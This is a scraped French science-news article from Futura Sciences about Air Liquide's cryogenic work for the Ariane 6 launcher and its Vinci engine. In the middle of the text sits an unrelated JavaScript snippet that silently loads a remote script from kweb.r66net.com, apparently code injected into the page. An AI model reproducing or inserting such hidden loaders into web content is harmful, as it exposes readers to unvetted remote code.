{"title": "Les technologies cryogeniques d'Ariane 6 decryptees par Air Liquide", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-06-22", "content": "Depuis 50 ans, les technologies cryogeniques a bord des lanceurs Ariane sont de la responsabilite d'Air Liquide. Le groupe est <<  autorite de conception cryogenique pour le systeme de lancement Ariane 6  >>. Xavier Vigor, directeur des technologies avancees d'Air Liquide, nous explique le role de sa societe dans le developpement de ce futur lanceur. Vous serez surpris de la complexite de la tache. Ce qu'il faut retenir Air liquide est responsable du froid a bord d'Ariane 6. Des ergols (hydrogene et oxygene liquide) identiques pour les deux etages tres differents l'un de l'autre. Pas de rupture technologique significative mais des evolutions de performance. Des technologies tres innovantes pour faire fonctionner le moteur Vinci. Partenaire historique dans toutes les phases de developpement et d'evolution des  lanceurs  du programme Ariane, <<  Air  Liquide  participe au projet du futur  lanceur europeen Ariane 6  >>, nous explique Xavier Vigor, directeur des technologies avancees de la societe. Dans la nouvelle organisation industrielle mise en place par ArianeGroup pour rationaliser l'outil industriel, qui se traduit par beaucoup moins de dispersion sur des sites en Europe et une chaine d'assemblage d'un etage complet a un seul endroit,  Air  Liquide est <<  autorite de conception cryogenique pour le systeme de lancement Ariane 6  >>. Reconnue pour son expertise cryogenique unique en Europe, l'entreprise a ete choisie pour la fourniture d'equipements de ce type destines a la propulsion du futur lanceur europeen Ariane 6. Au sol, <<  pour la production des  ergols  ( hydrogene  et  oxygene  liquide) et des installations necessaires pour approvisionner le lanceur  >>, puis a bord du lanceur avec <<  la fourniture des lignes d'alimentation des reservoirs des moteurs  >>. Air Liquide a ete sollicite pour sa competence en  matiere  de developpement mais aussi de conseil. Le groupe sera egalement charge des etudes cryogeniques visant a valider les equipements. Dans le cadre de cette nouvelle organisation industrielle, qui differe de celle mise en place pour developper et construire les lanceurs de la famille Ariane 5, des choix ont ete faits pour rationaliser l'outil. Cela se traduit par une politique qui regroupe les capacites industrielles des partenaires autour de  clusters  d'excellence (par exemple, les elements composites chez CASA, les elements metalliques chez MT-A, l'expertise cryogenique d'Air Liquide, etc.) et l'organisation de ces  clusters  autour d'une approche Lean globale, de facon a cadencer la production, comme si ArianeGroup avait une grande usine de production des elements du lanceur Ariane 6 a travers l'Europe. Les installations d'essais du site d'Air Liquide Advanced Technologies, a Sassenage (38). (c) Air Liquide                               Toujours des usines dans toute l'Europe, mais specialisees L'autre element de cette strategie consiste a moins de dispersion dans la production des elements du lanceur sur des sites en Europe, entre l'Allemagne, l'Espagne, la Belgique, la Russie, la France, la Suisse ou l'Italie, avec une chaine d'assemblage complete d'un etage a un seul endroit, ce qui n'etait pas le cas avec Ariane 5 ou seul le retour geographique prevalait au detriment, souvent, de l'efficacite industrielle.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ainsi, le reservoir d'oxygene liquide de l'etage superieur etait fabrique chez Air Liquide, tandis que les trois autres (ceux d'hydrogene et d'oxygene liquide de l'etage principal et celui d'hydrogene liquide de l'etage superieur) etaient realises aux Mureaux dans le cadre du GIE Euro Cryospace. Avec Ariane 6, l'etage principal sera realise aux Mureaux et l'etage superieur a Breme. Dans ce nouveau schema industriel, Air Liquide va fournir <<  les lignes cryogeniques, certains equipements de haute technicite des reservoirs et son expertise dans tout ce qui touche de pres ou de loin a la  cryogenie  >>. Dans son usine de Sassenage au pied du Vercors, le Centre d'essais d'Air Liquide sera egalement utilise pour <<  tester, controler et qualifier des equipements pour les besoins du lanceur Ariane 6  >>. Dans ce contexte, Air Liquide a signe fin 2016, <<  plusieurs contrats pour la fourniture d'equipements cryogeniques destines a la propulsion du lanceur, ainsi qu'a la conception et la realisation des systemes de fluides cryogeniques du nouvel Ensemble de lancement Ariane (ELA4) du  Centre spatial guyanais  (CSG)  >>.  Du point de vue de l'activite sur le site de Sassenage, <<  Ariane 6 nous incite a changer de schema industriel, notamment sur la partie fabrication  >>. En revanche, le programme Ariane 6 et l'entreprise etendue (<< Extended Entreprise >>) voulue par ArianeGroup, ou l'on ne travaille plus dans une relation client-fournisseur classique, en imposant des solutions, mais plutot dans une relation de partenariat ou l'on demande ce qu'un partenaire industriel est capable de faire pour un cout objectif donne, <<  ameliore nos technologies  cryotechniques  et nos couts industriels, ce qui doit nous permettre d'aller vers d'autres marches spatiaux, en Europe ou dans le reste du monde. De ce point de vue, c'est tres salutaire  >>. En d'autres termes, Air Liquide ne prevoit pas de baisses de son activite spatiale, mais <<  la part d'Ariane 6 sera proportionnellement plus faible que le programme Ariane 5, car on fait le pari de developper de  nouvelles activites spatiales  >>. Cryofenix ou une experience de microgravite pour ameliorer les performances d'Ariane 6. Realise en fevrier 2015, ce demonstrateur a teste en vol pour la premiere fois en Europe, le comportement d'hydrogene liquide cryogenique (soit a une temperature de -253 degC) durant 6 mn de microgravite (c) Anders Aberg, SSC Vidsel Test range                       Le role cle d'Air Liquide dans la mise en oeuvre du moteur Vinci Par rapport a  Ariane 5 , si Ariane 6 ne marque pas de  ruptures technologiques  significatives, il y a des evolutions de performance notamment avec le nouveau moteur cryogenique reallumable Vinci de l'etage superieur. Cette possibilite est un <<  element fondamental pour acceder a des  orbites  a haut  perigee  apres une phase de croisiere de plusieurs heures et optimiser la mise a poste des satellites  >>. Une nouveaute pour l'Europe qui necessite des technologies specifiques apportees par Air Liquide. <<  Une dizaine de ces technologies ont ete maturees dans nos installations de Sassenage et sont aujourd'hui utilisees pour Ariane 6  >>, pour s'assurer que le moteur Vinci fonctionnera correctement en orbite, notamment lors des phases de rallumage en  gravite  nulle ou en  microgravite . Il s'agit de s'assurer que  << les ergols presents dans le reservoir, les tuyaux ou le moteur ne flottent pas et qu'ils soient toujours proches de la chambre de combustion >> . Air Liquide a developpe une technologie qui permet <<  d'eviter que le liquide cryogenique stationne sur les parois du reservoir avec un risque reel d'evaporation  >>. Sans ce dispositif, le <<  reallumage de l'etage superieur Vinci n'aurait pu etre certain !  >> Air Liquide dispose aussi de modeles de calcul <<  capables de predire le comportement du  LOX  en gravite dans un reservoir soumis aux effets du  rayonnement solaire , un des parametres susceptibles de perturber le bon fonctionnement du moteur  >>. Enfin, compte tenu de la necessite de <<  maintenir les ergols des reservoirs a des niveaux de temperature tres bas (hydrogene liquide a -253 degC, oxygene a -183 degC)  >>, Air Liquide <<  verifiera le bon dimensionnement de la protection thermique du lanceur pour maintenir les bonnes gammes de temperatures  >>. Il faut savoir que sur les surfaces externes du lanceur, la temperature peut monter jusqu'a quelque 700 degC pour une distance de seulement trois centimetres entre ces deux temperatures. ", "theme": "sciences"}